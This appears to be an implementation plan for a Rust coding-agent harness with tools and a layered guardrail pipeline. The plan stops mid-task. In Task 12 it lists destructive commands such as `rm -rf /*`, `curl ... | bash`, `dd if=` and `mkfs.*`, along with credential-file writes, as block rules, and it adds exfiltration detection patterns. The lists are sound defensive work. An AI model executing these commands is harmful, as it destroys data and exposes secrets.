# HarnessAgent Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a complete Coding Agent Harness in Rust — a system that wraps an LLM as a "CPU" with tools, guardrails, feedback loops, memory, and a TUI, all testable with mock LLM providers.

**Architecture:** Trait-based dependency injection throughout — every component (LLM, tools, guardrails, feedback, memory) is behind a trait, enabling deterministic unit testing with mock implementations. The agent main loop orchestrates all components. The guardrail pipeline is the deep focus dimension with a four-layer architecture (static rules → risk assessment → approval state machine → sandbox boundary).

**Tech Stack:** Rust (edition 2024), tokio, reqwest, clap, ratatui, serde, tracing, keyring

## Global Constraints

- Rust edition: 2024
- Async runtime: tokio (multi-threaded)
- All mechanisms must be testable with mock LLM — no mechanism may depend on a real LLM call
- TDD: red → green → refactor for every task
- No real API keys in source code, git history, or logs
- Binary name: `harness`
- LLM provider: OpenAI API primary, Anthropic reserved
- TUI: ratatui-based, graceful degradation to plain CLI

---

## Phase 1: Project Scaffolding & Core Types (Tasks 1-3)

### Task 1: Initialize Cargo project with dependencies

**Files:**
- Modify: `Cargo.toml`
- Create: `src/lib.rs`, `src/main.rs`

**Produces:** `harness_agent` library crate, `harness` binary crate

- [ ] **Step 1: Write Cargo.toml with all dependencies**

```toml
[package]
name = "harnessAgent"
version = "0.1.0"
edition = "2024"

[dependencies]
tokio = { version = "1", features = ["full"] }
reqwest = { version = "0.12", features = ["json", "stream"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
clap = { version = "4", features = ["derive"] }
ratatui = "0.29"
crossterm = "0.28"
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter", "json"] }
chrono = { version = "0.4", features = ["serde"] }
keyring = "3"
rpassword = "7"
async-trait = "0.1"
thiserror = "2"
regex = "1"
glob = "0.3"
uuid = { version = "1", features = ["v4"] }
ring = "0.17"
aes-gcm = "0.10"
sha2 = "0.10"
rand = "0.8"
base64 = "0.22"
toml = "0.8"
dirs = "5"

[dev-dependencies]
tempfile = "3"
tokio-test = "0.4"
wiremock = "0.6"
```

- [ ] **Step 2: Create minimal lib.rs with module declarations**

```rust
//! HarnessAgent — Coding Agent Harness
pub mod types;
pub mod error;
pub mod llm;
pub mod config;
pub mod tools;
pub mod guardrails;
pub mod feedback;
pub mod memory;
pub mod subagent;
pub mod observability;
pub mod credentials;
pub mod tui;
```

- [ ] **Step 3: Create minimal main.rs**

```rust
fn main() {
    println!("HarnessAgent v0.1.0");
}
```

- [ ] **Step 4: Verify it compiles**

Run: `cargo build`
Expected: Fails because referenced modules don't exist yet. Create empty placeholder files for each module, then compile.

- [ ] **Step 5: Create placeholder module files**

Create empty files for each module declared in lib.rs:
```bash
for m in types error llm config tools guardrails feedback memory subagent observability credentials tui; do
  mkdir -p src/$m 2>/dev/null
  echo "// TODO" > src/$m/mod.rs
done
```

Run: `cargo build`
Expected: Compiles successfully

- [ ] **Step 6: Commit**

```bash
git add -A && git commit -m "feat: initialize project with dependencies and module structure

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 2: Define core data types

**Files:**
- Modify: `src/types.rs`

**Produces:** `Role`, `Message`, `ToolCall`, `Action`, `ToolResult`, `Artifact`, `LlmResponse`, `FinishReason`, `TokenUsage`, `GuardResult`, `GuardDecision`, `ToolInfo`, `FeedbackResult`, `FeedbackError`

- [ ] **Step 1: Write the complete types module**

Write `src/types.rs` with all the types from the design spec §6.1–6.5. See the spec for the full definitions. Key types:

```rust
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum Role { System, User, Assistant, Tool }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolCall { pub id: String, pub name: String, pub arguments: String }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Message { pub role: Role, pub content: String, pub tool_calls: Option<Vec<ToolCall>>, pub tool_call_id: Option<String> }

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum Action {
    #[serde(rename = "tool_call")] ToolCall { id: String, name: String, params: serde_json::Value },
    #[serde(rename = "final_answer")] FinalAnswer { summary: String },
    #[serde(rename = "ask_user")] AskUser { question: String },
    #[serde(rename = "noop")] NoOp,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolResult { pub success: bool, pub content: String, pub structured: Option<serde_json::Value>, pub artifacts: Vec<Artifact> }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Artifact { pub path: std::path::PathBuf, pub content_type: String, pub size_bytes: u64 }

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum FinishReason { Stop, ToolCalls, Length, ContentFilter }

#[derive(Debug, Clone, Copy, Default, Serialize, Deserialize)]
pub struct TokenUsage { pub prompt_tokens: u32, pub completion_tokens: u32, pub total_tokens: u32 }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LlmResponse { pub content: String, pub finish_reason: FinishReason, pub usage: TokenUsage, pub tool_calls: Option<Vec<ToolCall>> }

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum GuardDecision { Allowed, Blocked, Escalated, Approved, Denied, Timeout }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum GuardResult { Allowed, Denied { reason: String, decision: GuardDecision }, NeedsApproval { risk_level: String, reasons: Vec<String> } }

impl GuardResult {
    pub fn is_allowed(&self) -> bool { matches!(self, GuardResult::Allowed) }
    pub fn is_denied(&self) -> bool { matches!(self, GuardResult::Denied { .. }) }
    pub fn needs_approval(&self) -> bool { matches!(self, GuardResult::NeedsApproval { .. }) }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolInfo { pub name: String, pub description: String, pub parameters: serde_json::Value }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FeedbackError { pub file: Option<String>, pub line: Option<u32>, pub column: Option<u32>, pub error_type: String, pub message: String }

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FeedbackResult { pub channel: String, pub passed: bool, pub errors: Vec<FeedbackError>, pub summary: String }
```

- [ ] **Step 2: Write tests for serialization roundtrips**

Add `#[cfg(test)]` tests in `types.rs` testing:
- `Action` JSON roundtrip for all variants
- `GuardResult::is_allowed()` and `is_denied()` return correct values
- `Message` creation with all fields

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All type tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/types.rs && git commit -m "feat: define core data types

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 3: Define error types

**Files:**
- Modify: `src/error.rs` (currently placeholder)

**Produces:** `HarnessError` enum, `Result<T>` type alias

- [ ] **Step 1: Write error types**

```rust
use thiserror::Error;

#[derive(Debug, Error)]
pub enum HarnessError {
    #[error("LLM error: {0}")] Llm(String),
    #[error("Network error: {0}")] Network(#[from] reqwest::Error),
    #[error("Auth error: {0}")] Auth(String),
    #[error("Tool not found: {0}")] ToolNotFound(String),
    #[error("Tool execution error: {0}")] ToolExecution(String),
    #[error("Guardrail blocked: {0}")] GuardrailBlocked(String),
    #[error("Guardrail needs approval: {0}")] GuardrailNeedsApproval(String),
    #[error("Approval timeout")] ApprovalTimeout,
    #[error("Approval denied: {0}")] ApprovalDenied(String),
    #[error("Sandbox violation: {0}")] SandboxViolation(String),
    #[error("Config error: {0}")] Config(String),
    #[error("IO error: {0}")] Io(#[from] std::io::Error),
    #[error("JSON error: {0}")] Json(#[from] serde_json::Error),
    #[error("Max turns reached")] MaxTurnsReached,
    #[error("Token budget exhausted")] TokenBudgetExhausted,
    #[error("Subagent limit reached")] SubagentLimitReached,
    #[error("Recursion depth exceeded")] RecursionDepthExceeded,
    #[error("User interrupted")] UserInterrupted,
    #[error("Credential error: {0}")] Credential(String),
}

pub type Result<T> = std::result::Result<T, HarnessError>;
```

- [ ] **Step 2: Run tests**

Run: `cargo test`
Expected: Compiles and all existing tests pass

- [ ] **Step 3: Commit**

```bash
git add src/error.rs && git commit -m "feat: define error types

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 2: LLM Abstraction Layer (Tasks 4-5)

### Task 4: LlmProvider trait and MockLlmProvider

**Files:**
- Modify: `src/llm/mod.rs` (currently placeholder)
- Create: `src/llm/mock.rs`

**Produces:** `LlmProvider` trait, `MockLlmProvider`

- [ ] **Step 1: Write the trait and mock**

In `src/llm/mod.rs`:
```rust
use async_trait::async_trait;
use crate::types::{Message, LlmResponse};
use crate::error::HarnessError;

#[async_trait]
pub trait LlmProvider: Send + Sync {
    async fn complete(&self, messages: &[Message]) -> Result<LlmResponse, HarnessError>;
}

pub mod mock;
pub mod openai;
```

In `src/llm/mock.rs`:
```rust
use async_trait::async_trait;
use std::sync::Mutex;
use crate::llm::LlmProvider;
use crate::types::{Message, LlmResponse, FinishReason, TokenUsage};
use crate::error::HarnessError;

pub struct MockLlmProvider {
    responses: Mutex<Vec<LlmResponse>>,
    call_count: Mutex<usize>,
}

impl MockLlmProvider {
    pub fn new(responses: Vec<LlmResponse>) -> Self {
        Self { responses: Mutex::new(responses), call_count: Mutex::new(0) }
    }
    pub fn call_count(&self) -> usize { *self.call_count.lock().unwrap() }
}

#[async_trait]
impl LlmProvider for MockLlmProvider {
    async fn complete(&self, _messages: &[Message]) -> Result<LlmResponse, HarnessError> {
        let mut count = self.call_count.lock().unwrap();
        let mut responses = self.responses.lock().unwrap();
        let idx = *count;
        *count += 1;
        if idx < responses.len() {
            Ok(responses[idx].clone())
        } else {
            Ok(LlmResponse {
                content: "Done".to_string(),
                finish_reason: FinishReason::Stop,
                usage: TokenUsage::default(),
                tool_calls: None,
            })
        }
    }
}
```

- [ ] **Step 2: Write tests for MockLlmProvider**

In `src/llm/mock.rs`, add `#[cfg(test)] mod tests`:
- Test: `test_mock_returns_programmed_responses` — create mock with 2 responses, call twice, assert correct
- Test: `test_mock_exhausted_returns_default` — create empty mock, call once, assert default "Done" response
- Test: `test_mock_returns_tool_calls` — create mock with a ToolCall response, verify tool_calls field

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All mock tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/llm/ && git commit -m "feat: add LlmProvider trait and MockLlmProvider

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 5: OpenAI provider

**Files:**
- Modify: `src/llm/openai.rs` (currently placeholder)

**Produces:** `OpenAiProvider`

- [ ] **Step 1: Implement OpenAiProvider**

Implement `OpenAiProvider` with:
- Constructor: `new(api_key, model, base_url: Option<String>)`
- `build_request()`: converts `Vec<Message>` to OpenAI Chat Completions JSON format
- `complete()`: sends HTTP POST, parses response into `LlmResponse`
- Auth error (401) → `HarnessError::Auth`
- Rate limit (429) → `HarnessError::Llm("rate limited")`
- Map `finish_reason` string → `FinishReason` enum

- [ ] **Step 2: Write tests using wiremock**

In `src/llm/openai.rs`, add `#[cfg(test)] mod tests`:
- Test: `test_openai_handles_text_response` — mock server returns `{"choices":[{"message":{"content":"Hello!"},"finish_reason":"stop"}]}`, verify parsed correctly
- Test: `test_openai_handles_tool_calls` — mock server returns response with `tool_calls` array, verify parsed
- Test: `test_openai_handles_auth_error` — mock server returns 401, verify `HarnessError::Auth`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All OpenAI tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/llm/openai.rs Cargo.toml Cargo.lock && git commit -m "feat: add OpenAI provider implementation

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 3: Configuration System (Task 6)

### Task 6: Config loading, rules, and skills

**Files:**
- Modify: `src/config/mod.rs` (currently placeholder)
- Create: `src/config/rules.rs`
- Create: `src/config/skills.rs`

**Produces:** `HarnessConfig`, `RuleFile`, `SkillIndex`

- [ ] **Step 1: Implement HarnessConfig**

In `src/config/mod.rs`:
- Define `HarnessConfig` with all sub-configs: `LlmConfig`, `GuardConfig`, `SandboxConfig`, `ToolConfig`, `MemoryConfig`, `FeedbackConfig`, `AgentConfig`
- Implement `Default` for `HarnessConfig` with sensible defaults (model: "gpt-4o", max_turns: 50, approval_timeout: 120s)
- Implement `HarnessConfig::from_file(path)` — reads TOML, deserializes, validates
- Implement `validate()` — checks model is not empty, max_turns > 0

- [ ] **Step 2: Write config tests**

- Test: `test_default_config_is_valid`
- Test: `test_config_validation_rejects_empty_model`
- Test: `test_config_validation_rejects_zero_max_turns`
- Test: `test_load_from_toml` — write temp TOML file, load, verify fields

- [ ] **Step 3: Implement RuleFile**

In `src/config/rules.rs`:
- `RuleFile` struct with `rules: Vec<String>`
- `from_file(path)` — reads file, treats as plain text (one rule per line, skip empty/# comments)
- `to_system_prompt_fragment()` — formats rules as "## Rules (MUST follow):\n- rule1\n- rule2"

- [ ] **Step 4: Implement SkillIndex**

In `src/config/skills.rs`:
- `SkillDef` struct: `name`, `description`, `file_path`
- `SkillIndex::from_dir(dir)` — scans directory for `.md` files, extracts description from frontmatter (line starting with `description:`)
- `to_prompt_fragment()` — formats as "## Available Skills:\n- **name**: description"

- [ ] **Step 5: Run tests**

Run: `cargo test`
Expected: All config tests PASS

- [ ] **Step 6: Commit**

```bash
git add src/config/ && git commit -m "feat: add configuration system with rules and skills

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 4: Tool System (Tasks 7-11)

### Task 7: Tool trait, ToolContext, and ToolRegistry

**Files:**
- Modify: `src/tools/mod.rs` (currently placeholder)
- Create: `src/tools/context.rs`

**Produces:** `Tool` trait, `ToolContext`, `ToolRegistry`

- [ ] **Step 1: Implement ToolContext**

In `src/tools/context.rs`:
```rust
#[derive(Debug, Clone)]
pub struct ToolContext {
    pub workspace_root: std::path::PathBuf,
    pub command_timeout: std::time::Duration,
    pub network_allowed: bool,
}
impl Default for ToolContext { /* current_dir, 300s timeout, network allowed */ }
```

- [ ] **Step 2: Implement Tool trait and ToolRegistry**

In `src/tools/mod.rs`:
- `Tool` trait: `name()`, `description()`, `parameters()`, `execute()`
- `ToolRegistry`: `register()`, `get()`, `list_tools()`, `generate_tool_menu()`, `execute()`
- Tests: `test_registry_register_and_get`, `test_registry_list_tools`, `test_registry_execute`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All registry tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/tools/ && git commit -m "feat: add Tool trait, ToolContext, and ToolRegistry

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 8: File tools (read_file, write_file)

**Files:**
- Create: `src/tools/file.rs`

**Produces:** `ReadFileTool`, `WriteFileTool`

- [ ] **Step 1: Implement ReadFileTool**

- `name()` → "read_file"
- `parameters()` → JSON Schema with `path` (required), `offset`, `limit`
- `execute()` → read file at `ctx.workspace_root.join(path)`, apply offset/limit, return content with line numbers
- Test: `test_read_file`, `test_read_file_with_line_range`, `test_read_file_nonexistent`

- [ ] **Step 2: Implement WriteFileTool**

- `name()` → "write_file"
- `parameters()` → JSON Schema with `path` (required), `content` (required)
- `execute()` → create parent dirs, write file, return byte count
- Test: `test_write_file`, `test_write_file_creates_parent_dirs`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All file tool tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/tools/file.rs && git commit -m "feat: add read_file and write_file tools

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 9: Bash tool

**Files:**
- Create: `src/tools/bash.rs`

**Produces:** `BashTool`

- [ ] **Step 1: Implement BashTool**

- `name()` → "bash"
- `parameters()` → JSON Schema with `command` (required), `timeout_secs`
- `execute()` → run `sh -c "<command>"` in workspace_root, capture stdout+stderr, apply timeout
- Merge stdout and stderr into single output
- Test: `test_bash_echo`, `test_bash_command_failure`, `test_bash_timeout` (uses `sleep 10` with 1s timeout)

- [ ] **Step 2: Run tests**

Run: `cargo test`
Expected: All bash tool tests PASS

- [ ] **Step 3: Commit**

```bash
git add src/tools/bash.rs && git commit -m "feat: add bash tool

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 10: Search tools (grep, glob)

**Files:**
- Create: `src/tools/search.rs`

**Produces:** `GrepTool`, `GlobTool`

- [ ] **Step 1: Implement GrepTool**

- `name()` → "grep"
- `parameters()` → JSON Schema with `pattern` (required), `path` (optional, default ".")
- `execute()` → use `regex` crate, walk files in workspace, search for pattern, return matching lines with file:line prefix
- Test: `test_grep_finds_matches`, `test_grep_no_matches`

- [ ] **Step 2: Implement GlobTool**

- `name()` → "glob"
- `parameters()` → JSON Schema with `pattern` (required)
- `execute()` → use `glob` crate, list matching files in workspace
- Test: `test_glob_finds_files`, `test_glob_no_matches`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All search tool tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/tools/search.rs && git commit -m "feat: add grep and glob search tools

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 11: Git and test runner tools

**Files:**
- Create: `src/tools/git.rs`
- Create: `src/tools/test_runner.rs`

**Produces:** `GitDiffTool`, `RunTestTool`

- [ ] **Step 1: Implement GitDiffTool**

- `name()` → "git_diff"
- `parameters()` → JSON Schema with `staged` (optional bool)
- `execute()` → run `git diff` (or `git diff --cached`) in workspace_root, return output
- Test: `test_git_diff_in_temp_repo` — init temp git repo, commit file, modify, run diff

- [ ] **Step 2: Implement RunTestTool**

- `name()` → "run_test"
- `parameters()` → JSON Schema with `command` (required, default "cargo test")
- `execute()` → run the command in workspace_root, capture output, return with `success` based on exit code
- Test: `test_run_test_success`, `test_run_test_failure`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All git and test runner tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/tools/git.rs src/tools/test_runner.rs && git commit -m "feat: add git_diff and run_test tools

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Phase 5: Guardrails — Deep Focus (Tasks 12-18)

### Task 12: Static rule engine (Layer 1)

**Files:**
- Modify: `src/guardrails/mod.rs` (currently placeholder)
- Create: `src/guardrails/rules.rs`

**Produces:** `StaticRuleEngine`, `GuardRule`, `RulePattern`, `RuleAction`

- [ ] **Step 1: Implement GuardRule data structures**

In `src/guardrails/rules.rs`:
```rust
#[derive(Debug, Clone)]
pub enum RulePattern {
    CommandGlob { globs: Vec<String> },
    FilePath { paths: Vec<String>, op: FileOp },
    NetworkDest { hosts: Vec<String> },
    Composite { all: Vec<RulePattern>, any: Vec<RulePattern> },
}

#[derive(Debug, Clone)]
pub enum FileOp { Read, Write, Delete, Any }

#[derive(Debug, Clone)]
pub enum RuleAction { Allow, Deny(String), Escalate }

#[derive(Debug, Clone)]
pub struct GuardRule {
    pub id: String,
    pub name: String,
    pub pattern: RulePattern,
    pub action: RuleAction,
    pub priority: u8,
}
```

- [ ] **Step 2: Implement StaticRuleEngine**

```rust
pub struct StaticRuleEngine {
    rules: Vec<GuardRule>,
}

impl StaticRuleEngine {
    pub fn new() -> Self { Self { rules: Vec::new() } }
    pub fn add_rule(&mut self, rule: GuardRule) { self.rules.push(rule); }
    pub fn load_builtin_rules(&mut self) { /* add built-in dangerous rules */ }

    pub fn evaluate(&self, action: &Action, context: &GuardContext) -> RuleResult {
        // Sort rules by priority (highest first)
        // For each rule, check if pattern matches
        // Return the first matching rule's action
    }
}
```

- [ ] **Step 3: Add built-in dangerous rules**

`load_builtin_rules()` adds:
1. `rm -rf /*` → Deny("Destructive recursive deletion of root")
2. `rm -rf ~` → Escalate
3. `DROP TABLE` → Escalate
4. `DROP DATABASE` → Deny("Database deletion blocked")
5. `curl ... | bash` → Escalate
6. `git push --force` → Escalate
7. `chmod 777` → Escalate
8. `dd if=` → Deny("Block-level device operations blocked")
9. `mkfs.*` → Deny("Filesystem creation blocked")
10. Write to `/etc/*` → Escalate
11. Write to `~/.ssh/*` → Escalate
12. Write to `.env` → Escalate

- [ ] **Step 4: Write tests for static rules**

- Test: `test_rm_rf_root_blocked` — construct Action with `rm -rf /`, assert Deny
- Test: `test_drop_table_escalated` — construct Action with `DROP TABLE users`, assert Escalate
- Test: `test_normal_command_allowed` — construct Action with `cargo build`, assert not blocked
- Test: `test_file_write_to_etc_escalated` — construct Action writing to `/etc/config`, assert Escalate
- Test: `test_file_write_to_src_allowed` — construct Action writing to `src/main.rs`, assert not blocked
- Test: `test_priority_order` — rules with higher priority match first

- [ ] **Step 5: Run tests**

Run: `cargo test`
Expected: All static rule tests PASS

- [ ] **Step 6: Commit**

```bash
git add src/guardrails/ && git commit -m "feat: add static rule engine with built-in dangerous rules

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 13: Risk assessors (Layer 2)

**Files:**
- Create: `src/guardrails/assessor.rs`

**Produces:** `RiskAssessor` trait, `CommandRiskAssessor`, `FileRiskAssessor`, `NetworkRiskAssessor`, `RiskAssessment`, `RiskLevel`

- [ ] **Step 1: Implement RiskAssessment and RiskLevel types**

```rust
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RiskLevel { Low, Medium, High, Critical }

#[derive(Debug, Clone)]
pub struct RiskAssessment {
    pub level: RiskLevel,
    pub reasons: Vec<String>,
    pub suggested_mitigation: Option<String>,
}

impl RiskAssessment {
    pub fn merge(self, other: RiskAssessment) -> RiskAssessment {
        // Take the higher risk level, combine reasons
    }
}

#[async_trait]
pub trait RiskAssessor: Send + Sync {
    fn assess(&self, action: &Action, context: &GuardContext) -> RiskAssessment;
}
```

- [ ] **Step 2: Implement CommandRiskAssessor**

Checks bash commands for:
- `sudo` → High risk
- `|` (pipe) → Medium risk
- `>` or `>>` (redirect) → Medium risk
- `curl` or `wget` → Medium risk
- `&&` (chain) → Medium risk
- Combination of multiple risk factors → High

- [ ] **Step 3: Implement FileRiskAssessor**

Checks file operations for:
- Path outside workspace root → High
- Hidden files (`.env`, `.gitignore`) → Low
- System directories (`/etc`, `/usr`, `/boot`) → Critical
- Large number of files affected → Medium

- [ ] **Step 4: Implement NetworkRiskAssessor**

Checks for:
- Any outbound HTTP request → Medium
- Data exfiltration patterns (curl POST, scp) → High
- No network activity → Low

- [ ] **Step 5: Write tests**

- Test: `test_command_risk_sudo_is_high`
- Test: `test_command_risk_echo_is_low`
- Test: `test_file_risk_outside_workspace_is_high`
- Test: `test_file_risk_inside_workspace_is_low`
- Test: `test_network_risk_curl_is_medium`
- Test: `test_merge_assessments_takes_max` — Low + Medium → Medium, High + Low → High

- [ ] **Step 6: Run tests**

Run: `cargo test`
Expected: All risk assessor tests PASS

- [ ] **Step 7: Commit**

```bash
git add src/guardrails/assessor.rs && git commit -m "feat: add risk assessment layer with three assessors

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 14: Approval state machine (Layer 3)

**Files:**
- Create: `src/guardrails/approval.rs`

**Produces:** `ApprovalGate`, `ApprovalDecision`, `ApprovalRequest`

- [ ] **Step 1: Implement ApprovalGate**

```rust
pub struct ApprovalGate {
    timeout: Duration,
    session_whitelist: HashSet<String>,
}

pub enum ApprovalDecision { Approved { by: String, reason: Option<String> }, Denied { reason: String }, Timeout }

impl ApprovalGate {
    pub fn new(timeout: Duration) -> Self { ... }
    pub fn whitelist(&mut self, fingerprint: &str) { ... }
    pub fn is_whitelisted(&self, fingerprint: &str) -> bool { ... }
    pub async fn request_approval(&mut self, assessment: &RiskAssessment) -> ApprovalDecision {
        // 1. Generate fingerprint from action
        // 2. Check whitelist → if yes, return Approved
        // 3. Print risk info to stderr
        // 4. Wait for user input (y/n) with timeout
        // 5. If approved, add to whitelist
    }
}
```

- [ ] **Step 2: Implement action fingerprinting**

```rust
fn fingerprint_action(action: &Action) -> String {
    // Create a deterministic hash of the action's key properties
    // For ToolCall: hash of (tool_name + params)
    // This allows "same action within session" to be auto-approved
}
```

- [ ] **Step 3: Write tests**

- Test: `test_whitelist_auto_approves` — whitelist a fingerprint, request approval, assert Approved
- Test: `test_timeout_returns_denied` — set 1ms timeout, request approval, assert Timeout
- Test: `test_different_actions_not_whitelisted` — whitelist one action, verify different action not whitelisted

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All approval tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/guardrails/approval.rs && git commit -m "feat: add HITL approval state machine with session whitelist

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 15: Sandbox boundary (Layer 4)

**Files:**
- Create: `src/guardrails/sandbox.rs`

**Produces:** `SandboxBoundary`, `SandboxViolation`

- [ ] **Step 1: Implement SandboxBoundary**

```rust
pub struct SandboxBoundary {
    pub workspace_root: PathBuf,
    pub allowed_commands: Vec<String>,
    pub forbidden_commands: Vec<String>,
    pub max_timeout: Duration,
    pub network_allowed: bool,
}

impl SandboxBoundary {
    pub fn validate(&self, action: &Action) -> Result<(), SandboxViolation> {
        // 1. Check file paths are within workspace_root
        // 2. Check bash commands against allowed/forbidden lists
        // 3. Check timeout against max_timeout
        // 4. Check network access if network_allowed is false
    }

    pub fn wrap_command(&self, cmd: &str) -> String {
        // Add timeout wrapper: timeout <max_timeout> <cmd>
    }
}
```

- [ ] **Step 2: Write tests**

- Test: `test_path_outside_workspace_rejected` — validate write to `/etc/passwd`, assert Err
- Test: `test_path_inside_workspace_allowed` — validate write to `src/main.rs`, assert Ok
- Test: `test_forbidden_command_rejected` — add `rm` to forbidden, validate `rm file`, assert Err
- Test: `test_network_blocked` — set network_allowed: false, validate curl, assert Err
- Test: `test_command_wrapping_adds_timeout`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All sandbox tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/guardrails/sandbox.rs && git commit -m "feat: add sandbox boundary validation

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 16: GuardrailPipeline orchestration

**Files:**
- Modify: `src/guardrails/mod.rs`

**Produces:** `GuardrailPipeline`, `GuardContext`

- [ ] **Step 1: Implement GuardContext**

```rust
pub struct GuardContext {
    pub session_id: String,
    pub workspace_root: PathBuf,
    pub user_id: Option<String>,
}
```

- [ ] **Step 2: Implement GuardrailPipeline**

```rust
pub struct GuardrailPipeline {
    rules: StaticRuleEngine,
    assessors: Vec<Box<dyn RiskAssessor>>,
    approval: ApprovalGate,
    sandbox: SandboxBoundary,
    audit_log: AuditLog,
}

impl GuardrailPipeline {
    pub async fn check(&mut self, action: &Action, ctx: &GuardContext) -> Result<GuardResult, HarnessError> {
        // Layer 1: Static rules
        let rule_result = self.rules.evaluate(action, ctx);
        if rule_result.is_deny() { return Ok(GuardResult::Denied { ... }); }
        if rule_result.is_escalate() { /* continue to assessment */ }

        // Layer 2: Risk assessment
        let assessment = self.assessors.iter()
            .fold(RiskAssessment::default(), |acc, a| acc.merge(a.assess(action, ctx)));

        // Layer 3: Approval (if High)
        if assessment.level == RiskLevel::High {
            let decision = self.approval.request_approval(&assessment).await;
            match decision {
                ApprovalDecision::Approved { .. } => { /* continue */ }
                _ => { return Ok(GuardResult::Denied { ... }); }
            }
        }

        // Layer 4: Sandbox
        self.sandbox.validate(action)?;

        // Audit
        self.audit_log.record(action, &assessment, /* decision */);

        Ok(GuardResult::Allowed)
    }
}
```

- [ ] **Step 3: Write integration tests**

In `src/guardrails/mod.rs` `#[cfg(test)]`:
- Test: `test_pipeline_denies_rm_rf` — pipeline with builtin rules, action `rm -rf /`, assert Denied
- Test: `test_pipeline_allows_normal_command` — pipeline, action `cargo build`, assert Allowed
- Test: `test_pipeline_escalates_to_approval` — pipeline with mock approval (auto-deny), action requiring escalation, verify approval state machine is invoked
- Test: `test_pipeline_sandbox_rejects_outside_path` — pipeline with sandbox, write to `/etc`, assert Denied

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All pipeline tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/guardrails/mod.rs && git commit -m "feat: add GuardrailPipeline orchestration

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 17: Audit log

**Files:**
- Create: `src/guardrails/audit.rs`

**Produces:** `AuditLog`, `AuditEntry`

- [ ] **Step 1: Implement AuditLog**

```rust
pub struct AuditEntry {
    pub timestamp: chrono::DateTime<chrono::Utc>,
    pub session_id: String,
    pub action_summary: String,
    pub risk_level: String,
    pub decision: String,
    pub approver: Option<String>,
    pub reasons: Vec<String>,
}

pub struct AuditLog {
    output: std::path::PathBuf,
    entries: Vec<AuditEntry>,
}

impl AuditLog {
    pub fn new(output: std::path::PathBuf) -> Self { ... }
    pub fn record(&mut self, entry: AuditEntry) {
        self.entries.push(entry);
        // Append to JSONL file immediately
    }
    pub fn get_entries(&self) -> &[AuditEntry] { &self.entries }
}
```

- [ ] **Step 2: Write tests**

- Test: `test_audit_log_writes_to_file` — create temp file, record entry, verify file contains JSON line
- Test: `test_audit_log_multiple_entries` — record 3 entries, verify all in file
- Test: `test_audit_log_entries_include_timestamp`

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All audit log tests PASS

- [ ] **Step 4: Commit**

```bash
git add src/guardrails/audit.rs && git commit -m "feat: add audit log with JSONL output

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 18: Guardrail configuration file parsing

**Files:**
- Create: `src/guardrails/config.rs`

**Produces:** functions to parse guardrail rules from TOML/JSON config

- [ ] **Step 1: Implement guardrail config parsing**

```rust
pub fn parse_rules_from_file(path: &Path) -> Result<Vec<GuardRule>, HarnessError> {
    // Read JSON or TOML file with custom rules
    // Each rule: { id, name, pattern_type, pattern_value, action, priority }
    // Merge with built-in rules
}
```

- [ ] **Step 2: Write tests**

- Test: `test_parse_custom_rules_from_json`
- Test: `test_custom_rules_override_builtin` (higher priority wins)

- [ ] **Step 3: Run tests**

Run: `cargo test`
Expected: All tests PASS

- [ ] **Step 4: Commit**

```bash
